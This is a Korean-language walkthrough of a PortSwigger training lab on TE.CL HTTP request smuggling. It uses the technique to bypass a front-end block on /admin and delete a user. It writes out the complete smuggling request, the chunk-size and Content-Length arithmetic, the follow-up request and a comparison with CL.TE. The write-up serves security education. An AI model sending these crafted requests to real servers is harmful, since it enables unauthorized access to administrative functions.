# Lab: Bypassing front-end security controls, TE.CL vulnerability

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — TE.CL / 프론트엔드 접근 제어 우회
- **링크**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

## 목표

프론트엔드가 `/admin` 경로를 차단하는 구조에서, TE.CL 스머글링으로 프론트엔드 검사를 우회해 관리자 패널에 접근하고 carlos 를 삭제한다.

## 003 랩(CL.TE 우회)과의 비교

```
[003 랩 — CL.TE 우회]
  프론트엔드: Content-Length 사용  → body 전체를 백엔드로 전달
  백엔드:    Transfer-Encoding 사용 → 0\r\n\r\n 이후 버퍼 잔류
  외부 CL:   크게 설정
  스머글 방식: body 에 0\r\n\r\n + GET /admin prefix 삽입

[004 랩 (이번) — TE.CL 우회]
  프론트엔드: Transfer-Encoding 사용 → 청크 전체를 백엔드로 전달
  백엔드:    Content-Length 사용    → CL 바이트만 읽고 나머지 버퍼 잔류
  외부 CL:   작게 설정 (chunk size 줄 길이만큼)
  스머글 방식: chunk body 에 POST /admin 전체 삽입
```

## TE.CL 접근 제어 우회 원리

```
[공격 요청 구조]
  POST / HTTP/1.1
  Content-Length: 4          ← 백엔드(CL): 이 4바이트만 읽음
  Transfer-Encoding: chunked

  [hex]\r\n                  ← 백엔드: 이 4바이트(chunk size 줄)를 body 로 읽고 종료
  POST /admin HTTP/1.1\r\n   ← 프론트엔드(TE): 청크 전달 / 백엔드: 버퍼 잔류
  Host: localhost\r\n
  Content-Length: 150\r\n
  \r\n
  x=smuggled
  0\r\n
  \r\n

[프론트엔드 처리]
  Transfer-Encoding: chunked → 청크 전체를 읽어 백엔드로 전달
  (POST /admin 은 프론트엔드 관점에서는 body 의 일부)

[백엔드 처리]
  Content-Length: 4 → chunk size 줄("xx\r\n") 4바이트만 읽고 POST / 처리 완료
  → 나머지(POST /admin...) 버퍼 잔류

[follow-up 도착 시]
  백엔드 버퍼: POST /admin (CL=150, 실제 body 부족)
  → follow-up 바이트가 부족한 body 를 채움
  → POST /admin 처리 완료 → admin 응답 → follow-up 에 매핑
```

## 공격 패킷

### Attack 요청

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

[hex]
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

x=smuggled
0

```

```
chunk size 계산:
  POST /admin HTTP/1.1\r\n          = 20
  Host: localhost\r\n               = 17
  Content-Type: application/...\r\n = 49
  Content-Length: 150\r\n           = 21
  \r\n                              =  2
  x=smuggled                        = 10
  ─────────────────────────────────
  합계: 119 = 0x77

Content-Length: 4 계산:
  "77\r\n" = 4바이트 (hex 값에 따라 달라짐)

Content-Length: 150 (smuggled request):
  실제 body = "x=smuggled" = 10바이트
  chunk 종료 바이트 "\r\n0\r\n\r\n" = 7바이트
  합계 17바이트 → 150에 133바이트 부족
  → 백엔드가 follow-up 을 기다림 → 연결 유지 ✓
```

### Follow-up 요청

```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close

```

## 003 랩(CL.TE)과 구조적 차이 정리

| 항목 | CL.TE (003) | TE.CL (004, 이번) |
|------|-------------|------------------|
| 외부 CL 값 | 크게 (body 전체) | 작게 (chunk size 줄만) |
| 외부 TE 역할 | 백엔드 파싱 기준 | 프론트엔드 파싱 기준 |
| 버퍼 잔류 이유 | TE: 0\r\n\r\n 이후 무시 | CL: chunk size 줄만 읽음 |
| smuggled 방식 | 0\r\n\r\n + prefix | chunk body 에 전체 요청 삽입 |
| smuggled CL 값 | N/A | body 보다 크게 (150) |
| Follow-up | GET / | GET / |

## 핵심 정리

- TE.CL 스머글링에서 외부 `Content-Length` 는 **chunk size 줄의 바이트 수만큼 작게** 설정한다. 백엔드(CL)가 이 줄만 읽고 종료하도록 하기 위함이다.
- smuggled 요청 안의 `Content-Length` 는 **실제 body 보다 크게** 설정해야 한다. 백엔드가 follow-up 바이트를 기다리도록 해서 응답이 follow-up 에 정확히 매핑되게 한다.
- 프론트엔드는 `Transfer-Encoding` 으로 청크 전체를 읽어 백엔드로 전달하므로, POST /admin 은 프론트엔드 관점에서 단순 body 데이터이다 → 접근 제어 우회.

## 배운 점

### CL.TE vs TE.CL 우회 전체 비교

| 항목 | CL.TE 탐지(001) | TE.CL 탐지(002) | CL.TE 우회(003) | TE.CL 우회(004) |
|------|----------------|----------------|----------------|----------------|
| 목적 | 취약점 확인 | 취약점 확인 | /admin 접근 | /admin 접근 |
| 심는 방식 | 0\r\n\r\n+prefix | chunk+smuggled POST | 0\r\n\r\n+prefix | chunk+smuggled POST |
| Probe/Follow-up | GET | POST | GET | GET |
| smuggled CL | 없음 | 150+ | 20 | 150+ |
| 성공 지표 | 404 응답 | 404 응답 | admin HTML | admin HTML |
